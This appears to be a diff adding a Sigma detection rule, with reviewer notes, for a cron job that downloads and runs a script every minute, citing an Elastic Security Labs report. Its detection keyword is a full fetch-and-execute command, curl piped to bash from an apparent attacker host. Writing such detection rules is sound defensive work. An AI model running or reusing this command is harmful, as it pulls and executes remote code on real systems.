@@ -1,0 +1,29 @@
+# review_report_url: https://www.elastic.co/security-labs/betting-on-bots
+# review_date: 2024-10-06
+# review_author: Blackpearl
+# review_rule_useful: true
+# review_rule_classification: proceed to testing
+# review_rule_classification_reason: na
+# review_rule_ttp_match: yes
+# review_notes:
+#  - This Sigma rule detects a suspicious cron job that downloads and executes a script from a specific URL every minute, a potential indicator of persistent malicious activity. It focuses on the presence of the command using curl to retrieve and execute the script via bash, highlighting a common technique for remote code execution and persistence.
+title: Detect Download and Execution of Malicious Script via Crontab
+id: c7b25f94-b9c4-400c-a913-32ddc627822e
+status: experimental
+description: Detects the download of a malicious script from a specific URL every minute and its execution via crontab, which is indicative of a persistent threat actor.
+references:
+  - https://www.elastic.co/security-labs/betting-on-bots
+author: System Two Security
+date: 2024/10/02
+tags:
+  - attack.t1053.003
+  - attack.persistence
+logsource:
+  product: linux
+  service: cron
+detection:
+  keywords: curl -s http://gcp.pagaelrescate.com:8080/ifindyou | bash
+  condition: keywords
+falsepositives:
+  - Legitimate cron jobs that download scripts from the internet and execute them, although this is uncommon and should be reviewed.
+level: high
